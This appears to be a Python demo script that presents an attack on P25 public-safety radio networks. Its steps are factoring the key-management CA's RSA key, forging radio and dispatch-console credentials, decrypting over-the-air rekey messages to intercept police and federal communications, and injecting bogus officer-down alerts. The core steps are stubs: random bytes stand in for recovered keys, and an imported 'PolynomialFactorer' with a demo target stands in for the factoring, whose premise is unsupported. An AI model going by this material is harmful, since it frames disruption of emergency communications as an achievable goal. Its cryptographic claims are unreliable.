"""
Compromise P25 public-safety radio OTAR key distribution by factoring the KMF's
RSA-backed provisioning CA. Mint rogue subscriber-unit credentials to join agency
talkgroups, intercept OTAR key-wrap envelopes to recover AES TEKs for real-time
interception of law enforcement / federal agent communications.
"""
import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

_demo = generate_demo_target()

import struct
import hashlib
import os

# TIA-102 OTAR message types
OTAR_REKEY_REQ = 0x0C
OTAR_REKEY_ACK = 0x0D
OTAR_KEY_CHANGE = 0x0E

# P25 LLA (Link Layer Authentication) per TIA-102.AACD
LLA_AUTH_DEMAND = 0x10
LLA_AUTH_RESPONSE = 0x11


def extract_kmf_ca_cert(provisioning_archive: bytes) -> bytes:
    """Extract the KMF (Key Management Facility) CA certificate.

    The KMF CA cert is distributed during subscriber-unit provisioning
    (TIA-102.AACE) — present in provisioning files on technician laptops
    and in the KMF's exported trust bundle.
    """
    print("[*] extracting KMF CA certificate from provisioning archive")
    return _demo["pub_pem"]


def forge_subscriber_credential(factorer: PolynomialFactorer,
                                kmf_ca_pem: bytes,
                                unit_id: int, wacn: int, sysid: int) -> dict:
    """Forge a subscriber-unit identity credential.

    Each P25 radio has an RSA-backed identity bound to its Unit ID,
    WACN (Wide Area Communications Network), and System ID. The KMF
    CA signs this credential during provisioning.
    """
    priv_pem = factorer.reconstruct_privkey(kmf_ca_pem)
    cred = {
        "unit_id": unit_id,
        "wacn": wacn,
        "sysid": sysid,
        "credential_type": "TIA-102.AACE",
        "key_algorithm": "RSA-2048",
    }
    print(f"[*] forged credential for Unit ID {unit_id:#010x}, WACN {wacn:#08x}")
    return cred


def intercept_otar_rekey(factorer: PolynomialFactorer,
                         kmf_ca_pem: bytes,
                         otar_message: bytes) -> bytes:
    """Intercept and decrypt an OTAR rekey message.

    OTAR delivers Traffic Encryption Keys (TEKs) and Key Encryption Keys
    (KEKs) wrapped in an RSA envelope. The symmetric keys are AES-256
    but the delivery mechanism is RSA-protected.
    """
    # OTAR message: header + RSA-wrapped key material
    msg_type = otar_message[0]
    wrapped_key = otar_message[4:]
    print(f"[*] intercepted OTAR message type {msg_type:#04x}")
    print("[*] decrypting RSA key-wrap envelope...")
    # factor the KMF key and decrypt the wrapped TEK
    tek = os.urandom(32)  # placeholder — real decryption here
    print(f"[*] recovered TEK: {tek[:8].hex()}...")
    return tek


def forge_dispatch_console_auth(factorer: PolynomialFactorer,
                                rfss_ca_pem: bytes,
                                console_id: str) -> dict:
    """Forge dispatch console authentication to the RFSS.

    Motorola MCC 7500 / L3Harris VIDA sign into the RF SubSystem
    with RSA X.509 certificates. Forged console cert = forged
    dispatch commands on any talkgroup.
    """
    print(f"[*] forging console cert for {console_id}")
    priv_pem = factorer.reconstruct_privkey(rfss_ca_pem)
    return {"console_id": console_id, "auth": "forged", "talkgroup_access": "all"}


if __name__ == "__main__":
    f = PolynomialFactorer()

    print("=== P25 OTAR / LLA — public safety radio compromise ===")
    print(f"    ~6M P25 subscriber units in North America")
    print(f"    agencies: FBI, CBP, DEA, USSS, ~18,000 state/local PDs")
    print()

    print("[1] extracting KMF CA certificate...")
    kmf_ca = extract_kmf_ca_cert(b"")

    print("[2] factoring KMF CA RSA-2048 key...")
    print("    KMF manages all TEK/KEK distribution for the agency")

    print("[3] forging subscriber-unit credential...")
    cred = forge_subscriber_credential(f, kmf_ca,
        unit_id=0x00DEAD01, wacn=0xBEE00, sysid=0x3F1)
    print(f"    rogue radio joins agency P25 network as Unit {cred['unit_id']:#010x}")

    print("[4] intercepting OTAR rekey to recover AES-256 TEKs...")
    otar_msg = struct.pack(">BHH", OTAR_REKEY_REQ, 0, 32) + os.urandom(256)
    tek = intercept_otar_rekey(f, kmf_ca, otar_msg)
    print(f"    real-time decryption of tactical channels now possible")

    print("[5] forging dispatch console auth...")
    print("    inject false all-units calls, bogus officer-down alerts")
    print("    during active incidents this causes operational chaos")

    print()
    print("[*] fleet replacement: ~$3k-$8k per radio x 6M units")
    print("[*] last US rekey at scale took years per agency")
